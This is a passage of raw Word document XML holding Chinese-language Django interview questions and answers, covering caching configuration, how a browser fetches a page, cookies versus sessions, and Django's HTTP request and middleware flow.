        <w:t>Django 自带了一个健壮的缓存系统来保存动态页面这样避免对于每次请求都重新计算。方便起见，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F6D90E1" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="595" w:name="8781-1535455695644"/>
      <w:bookmarkEnd w:id="595"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django 提供了不同级别的缓存粒度：可以缓存特定视图的输出、可以仅仅缓存那些很难生产出来的部分、或者可以缓存整个网站 Django 也能很好的配合那些“下游”缓存，  比如  Squid  和基于浏览器的缓存。这里有一些缓存不必要直接去控制但是可以提供线索， (via HTTPheaders)关于网站哪些部分需要缓存和如何缓存。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="695BCB8C" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="596" w:name="2960-1535455695644"/>
      <w:bookmarkEnd w:id="596"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>设置缓存：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="019CB977" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="597" w:name="8800-1535455695644"/>
      <w:bookmarkEnd w:id="597"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>缓存系统需要一些设置才能使用。 也就是说，你必须告诉他你要把数据缓存在哪里- 是数据库中， 文件系统或者直接在内存中。 这个决定很重要，因为它会影响你的缓存性能，是的，一些缓存类型要比其他的缓存类型更快速。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7483CA84" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="598" w:name="4947-1535455695644"/>
      <w:bookmarkEnd w:id="598"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>你的缓存配置是通过 setting 文件的 </w:t>
      </w:r>
      <w:hyperlink r:id="rId227" w:history="1">
        <w:r w:rsidRPr="003547BF">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>CACHES </w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>配置来实现的。这里有 </w:t>
      </w:r>
      <w:hyperlink r:id="rId228" w:history="1">
        <w:r w:rsidRPr="003547BF">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>CACHES </w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>所有可配置的变量值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EFD244F" w14:textId="4B5DA286"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599" w:name="8740-1535455714354"/>
      <w:bookmarkStart w:id="600" w:name="1775-1535455715513"/>
      <w:bookmarkEnd w:id="599"/>
      <w:bookmarkEnd w:id="600"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>026</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请简述浏览器是如何获取一枚网页的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5066E7E7" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="601" w:name="3550-1535455717680"/>
      <w:bookmarkEnd w:id="601"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（1）在用户输入目的 URL 后，浏览器先向 DNS 服务器发起域名解析请求；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16DB76D7" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="602" w:name="7516-1535455725012"/>
      <w:bookmarkEnd w:id="602"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（2）在获取了对应的 IP 后向服务器发送请求数据包；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C6ADB7C" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="603" w:name="7326-1535455725012"/>
      <w:bookmarkEnd w:id="603"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（3）服务器接收到请求数据后查询服务器上对应的页面，并将找到的页面代码回复给客户端；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A732BE5" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="604" w:name="6570-1535455725012"/>
      <w:bookmarkEnd w:id="604"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（4）客户端接收到页面源代码后，检查页面代码中引用的其他资源，并再次向服务器请求该资源；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F67AFCF" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="605" w:name="6297-1535455725012"/>
      <w:bookmarkEnd w:id="605"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（5）在资源接收完成后，客户端浏览器按照页面代码将页面渲染输出显示在显示器上；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67D053D7" w14:textId="0E523E3B"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06" w:name="5167-1535455673883"/>
      <w:bookmarkStart w:id="607" w:name="1893-1535455748972"/>
      <w:bookmarkEnd w:id="606"/>
      <w:bookmarkEnd w:id="607"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>027</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对</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t> cookie</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>session </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的了解？他们能单独用吗</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2D4F6C" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="608" w:name="6866-1535455751010"/>
      <w:bookmarkEnd w:id="608"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Session 采用的是在服务器端保持状态的方案，而 Cookie 采用的是在客户端保持状态的方案。但是禁用 Cookie 就不能得到 Session。因为 Session  是用  Session ID  来确定当前对话所对应的服务器 Session，而 Session ID 是通过  Cookie  来传递的，禁用  Cookie  相当于失去了  SessionID，也就得不到 Session。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4CC6C9" w14:textId="771B9929"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09" w:name="8932-1535455758587"/>
      <w:bookmarkStart w:id="610" w:name="5934-1535455767532"/>
      <w:bookmarkEnd w:id="609"/>
      <w:bookmarkEnd w:id="610"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>028</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HTTP </w:t>
      </w:r>
      <w:r w:rsidR="001C47AF" w:rsidRPr="001C47AF">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>请求的处理流程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B730414" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="611" w:name="7067-1535455791765"/>
      <w:bookmarkEnd w:id="611"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django 和其他 Web 框架的 HTTP 处理的流程大致相同，Django 处理一个  Request 的过程是首先通过中间件，然后再通过默认的 URL 方式进行的。我们可以在 Middleware 这个地方把所有</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0670653C" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="612" w:name="3325-1535455792748"/>
      <w:bookmarkEnd w:id="612"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Request 拦截住，用我们自己的方式完成处理以后直接返回 Response。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20E86CEA" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="613" w:name="2471-1535455792748"/>
      <w:bookmarkEnd w:id="613"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（1）加载配置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FA716BE" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="614" w:name="3341-1535455792748"/>
      <w:bookmarkEnd w:id="614"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django  的配置都在  “Project/settings.py”  中定义，可以是 Django 的配置，也可以是自定义的配置，并且都通过 django.conf.settings 访问，非常方便。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18202050" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="615" w:name="8787-1535455792748"/>
      <w:bookmarkEnd w:id="615"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（2）启动</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="238453C3" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="616" w:name="8498-1535455792748"/>
      <w:bookmarkEnd w:id="616"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>最核心动作的是通过 django.core.management.commands.runfcgi 的 Command 来启动， 它运行 django.core.servers.fastcgi 中的  runfastcgi，runfastcgi  使用了  flup  的 WSGIServer来启动 fastcgi 。而 WSGIServer  中携带了  django.core.handlers.wsgi  的</w:t>
      </w:r>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">  WSGIHandler  类的一个实例，通过 WSGIHandler 来处理由 Web 服务器（比如  Apache，Lighttpd  等）传过来的请求，此时才是真正进入 Django 的世界。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="268E2A3F" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="617" w:name="2882-1535455792748"/>
      <w:bookmarkEnd w:id="617"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（3）处 理 Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36F77486" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="618" w:name="6030-1535455792748"/>
      <w:bookmarkEnd w:id="618"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当有 HTTP 请求来时，WSGIHandler 就开始工作了，它从 BaseHandler 继承而来。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E3E1704" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="619" w:name="2064-1535455792748"/>
      <w:bookmarkEnd w:id="619"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>WSGIHandler 为每个请求创建一个 WSGIRequest 实例，而 WSGIRequest 是从</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F05C23B" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="620" w:name="5923-1535455792748"/>
      <w:bookmarkEnd w:id="620"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>http.HttpRequest 继承而来。接下来就开始创建 Response 了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AF919BD" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="621" w:name="9360-1535455792748"/>
      <w:bookmarkEnd w:id="621"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（4）创 建 Response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215D4C5E" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="622" w:name="8181-1535455792748"/>
      <w:bookmarkEnd w:id="622"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>BaseHandler 的 get_response 方法就是根据 request 创建 response，而具体生成</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13476A6C" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="623" w:name="2058-1535455792748"/>
      <w:bookmarkEnd w:id="623"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>response 的动作就是执行 urls.py 中对应的 view 函数了，这也是 Django 可以处理“友好 URL ” 的关键步骤，每个这样的函数都要返回一个 Response 实例。此时一般的做法是通过 loader 加载template 并生成页面内容，其中重要的就是通过 ORM 技术从数据库中取出数据，并渲染到Template 中，从而生成具体的页面了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35CA7485" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="624" w:name="4746-1535455792748"/>
      <w:bookmarkEnd w:id="624"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>（5）处 理 Response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E4F081" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="625" w:name="3644-1535455792748"/>
      <w:bookmarkEnd w:id="625"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django 返回 Response 给  flup，flup  就取出  Response  的内容返回给  Web  服务器，由后者返回给浏览器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13EB44B5" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="626" w:name="9779-1535455792748"/>
      <w:bookmarkEnd w:id="626"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>总之，Django 在 fastcgi 中主要做了两件事：处理 Request 和创建 Response，而它们对应的核心就是“ urls 分析”、“模板技术”和“ ORM 技术”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B77DF0" w14:textId="1497EF17" w:rsidR="001C47AF" w:rsidRDefault="001C47AF" w:rsidP="001C47AF">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="390" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="627" w:name="7078-1535455887934"/>
      <w:bookmarkEnd w:id="627"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:noProof/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="01890C5B" wp14:editId="1FFBA93B">
            <wp:extent cx="5305425" cy="35528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05425" cy="3552825"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="71674424" w14:textId="77777777" w:rsidR="001C47AF" w:rsidRPr="003547BF" w:rsidRDefault="001C47AF" w:rsidP="003547BF">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="628" w:name="9686-1535455660380"/>
      <w:bookmarkEnd w:id="628"/>
      <w:r w:rsidRPr="003547BF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>       如图所示，一个 HTTP 请求，首先被转化成一个 HttpRequest 对象，然后该对象被传递给Request 中间件处理，如果该中间件返回了 Response，则直接传递给 Response 中间件做收尾处理。否则的话 Request 中间件将访问 URL 配置，确定哪个 view 来处理，在确定了哪个 view 要执行，但是还没有执行该 view 的时候，系统会把 request 传递给  view  中间件处理器进行处理，如果该中间件返回了 Response，那么该 Response 直接被传递给 Response  中间件进行后续处理，否则将执行确定的 view 函数处理并返回  Response，在这个过程中如果引发了异常并抛出，会被  Exception 中间件处理器进行处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21ADFEC2" w14:textId="41ECD5A8"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29" w:name="8727-1535455925322"/>
